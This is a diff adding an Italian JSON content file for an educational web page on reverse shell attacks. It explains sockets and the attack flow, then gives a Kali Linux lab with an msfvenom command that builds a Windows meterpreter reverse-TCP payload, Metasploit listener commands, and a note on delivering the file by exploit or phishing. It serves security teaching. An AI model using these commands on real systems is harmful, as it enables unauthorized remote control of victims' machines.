@@ -1,0 +1,36 @@
+{   
+    "introduzione" : 
+    {
+        "title" : "Attacco Reverse Shell",
+        "subtitle" : "Esplora i dettagli di un attacco reverse shell e scopri come realizzarne uno in un ambiente di laboratorio controllato."
+    },
+
+    "spiegazione" : 
+    {
+        "title":"<h4>Cos'è una Reverse Shell?</h4>",
+        "description1":"Una <b>reverse shell</b> è un tipo di attacco che consente a un aggressore di ottenere accesso remoto a un sistema vulnerabile. L'attacco si basa sull'uso delle <b>socket</b>, un'interfaccia di comunicazione che permette il trasferimento di dati tra due macchine. La particolarità della reverse shell è che è la macchina vittima a stabilire la connessione verso l'aggressore, bypassando spesso le restrizioni del firewall o NAT.",
+        "subtitle1":"Come funziona?",
+        "description2":"<li>Un aggressore configura un server di ascolto (listener) sulla propria macchina, in attesa di connessioni in entrata.</li><li>La vittima esegue un <a href='glossario.html' style='text-decoration: none;' class='text-warning'>payload</a> malevolo (spesso tramite exploit o file infetto), che apre una connessione verso il listener dell'attaccante.</li><li>L'attaccante ottiene una shell remota sulla macchina vittima, consentendo l'esecuzione di comandi con i privilegi della vittima.</li>",
+        "subtitle3":"Perché le socket sono fondamentali?",
+        "description3":"Le socket sono il cuore della comunicazione client-server. In un attacco reverse shell:<ul><li>La <b>socket client</b> (vittima) stabilisce la connessione con la <b>socket server</b> (attaccante).</li><li>Una volta stabilita, i dati (comandi e output) fluiscono attraverso questa connessione bidirezionale.</li></ul>"
+    },
+
+    "laboratorio" : 
+    {
+        "title":"<h4>Laboratorio: Esecuzione di un attacco Reverse Shell con Kali Linux</h4>",
+        "title_prerec":"Preparativi",
+        "prerec":"<ol><li>Assicurati di avere <b>Kali Linux</b> installato e funzionante.</li><li>Verifica di avere <b><a href='glossario.html' style='text-decoration: none;' class='text-warning'>Msf(Metasploit framework)</a></b> e <b><a href='glossario.html' style='text-decoration: none;' class='text-warning'>msfvenom</a></b> configurati correttamente.</li><li>Imposta un ambiente di laboratorio controllato (ad esempio una macchina virtuale come vittima).</li></ol>",
+        "subtitle1":"Passaggi",
+        "subtitle11":"Creazione del payload con msfvenom",
+        "content11":"<span style='display: block;'># Genera un payload per Windows con msfvenom:</span><span style='display: block;'>msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f exe -o shell.exe</span><span style='display: block;'># Su LHOST completa con l'IP della macchina Kali (attaccante) e completa LPORT con la porta da utilizzare.</span>",
+        "subtitle12":"Avvio del listener su Metasploit",
+        "content12":"<span style='display: block;'># Avvia Metasploit:</span><span style='display: block;'>msfconsole</span><span style='display: block;'># Configura il listener:</span><span style='display: block;'>use exploit/multi/handler</span><span style='display: block;'>set payload windows/meterpreter/reverse_tcp</span><span style='display: block;'>set LHOST &lt;tuo_IP&gt;</span><span style='display: block;'>set LPORT &lt;porta&gt;</span><span style='display: block;'>exploit</span>",
+        "subtitle13":"Esecuzione del payload sulla macchina vittima",
+        "content13":"Trasferisci il file `shell.exe` sulla macchina vittima (tramite exploit, phishing o altri metodi controllati). Quando il file viene eseguito:<ul><li>La macchina vittima stabilisce una connessione con il listener Metasploit sulla macchina attaccante.</li><li>Si apre una shell Meterpreter che consente all'attaccante di controllare il sistema remoto.</li></ul>",
+        "subtitle14":"Test delle funzionalità",
+        "content14":"<p>Una volta connesso, prova comandi come:</p><pre class='bg-dark text-light p-3'><span style='display: block;'>sysinfo  # Mostra le informazioni di sistema della vittima</span><span style='display: block;'>getuid   # Mostra l'utente attualmente collegato</span></pre>",
+        "subtitle2":"Nota Importante",
+        "content2":"Questo laboratorio è esclusivamente a scopo didattico. Utilizzalo solo in ambienti controllati e con il consenso delle parti coinvolte. Qualsiasi utilizzo non autorizzato è illegale e contrario all'etica informatica."
+    }
+
+}
